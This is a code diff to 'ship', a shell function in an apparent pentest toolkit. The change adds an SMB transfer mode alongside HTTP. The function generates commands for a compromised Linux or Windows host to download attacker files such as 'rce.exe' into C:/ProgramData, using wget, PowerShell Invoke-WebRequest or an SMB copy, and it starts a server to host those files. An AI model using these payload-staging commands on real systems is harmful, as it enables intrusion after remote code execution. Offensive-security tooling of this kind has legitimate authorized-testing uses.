@@ -413,14 +413,16 @@ function svc() {
 #   ship ./rce.sh
 #   ship -t windows ./rce.exe
 # Category: [ rce, pe, file-transfer ]
+# TODO: wrap input validation
 function ship() {
     local type="linux"
-    local autoHostHttp=true
+    local mode="http"
+    local autoHost=true
     local filepaths=()
     local all_cmds=""
 
     _helper() {
-        swiss_logger info "Usage: ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>..."
+        swiss_logger info "Usage: ship [-t, --type linux|windows] [-a, --auto-host] [-m, --mode http|smb] <filepath>..."
         return 1
     }
 
@@ -430,13 +432,17 @@ function ship() {
                 type="$2"
                 shift 2
                 ;;
-            -a|--auto-host-http)
-                autoHostHttp="$2"
+            -a|--auto-host)
+                autoHost="$2"
                 shift 2
                 ;;
             -h|--help)
                 _helper
                 return 0
+                ;;
+            -m|--mode)
+                mode="$2"
+                shift 2
                 ;;
             *)
                 filepaths+=("$1")
@@ -464,9 +470,20 @@ function ship() {
 
         local cmd
         if [[ "$type" == "linux" ]]; then
-            cmd="wget $(_get_default_network_interface_ip)/$filename"
+            if [[ "$mode" == "http" ]]; then
+                cmd="wget $(_get_default_network_interface_ip)/$filename"
+            else
+                swiss_logger error "[e] Currently Linux only support HTTP mode."
+                exit 1
+            fi
         elif [[ "$type" == "windows" ]]; then
-            cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
+            if [[ "$mode" == "smb" ]]; then
+                cmd="copy \\\\\\$(_get_default_network_interface_ip)\\\\smb\\\\$filename C:/ProgramData/$filename"
+            elif [[ "$mode" == "http" ]]; then
+                cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip)/$filename' -OutFile C:/ProgramData/$filename\""
+            else
+                swiss_logger error "[e] unsupported type (smb|http)."
+            fi
         else
             log error "[e] Unknown type '$type'."
             return 1
@@ -476,8 +493,12 @@ function ship() {
     done
 
     _autoHost() {
-        if [[ "$autoHostHttp" = true ]]; then
-            svc http
+        if [[ "$autoHost" = true ]]; then
+            if [[ "$mode" == "smb" ]]; then
+                svc smb
+            elif [[ "$mode" == "http" ]]; then
+                svc http
+            fi
         else
             swiss_logger warn "[w] Remember to host the web server on your own"
         fi
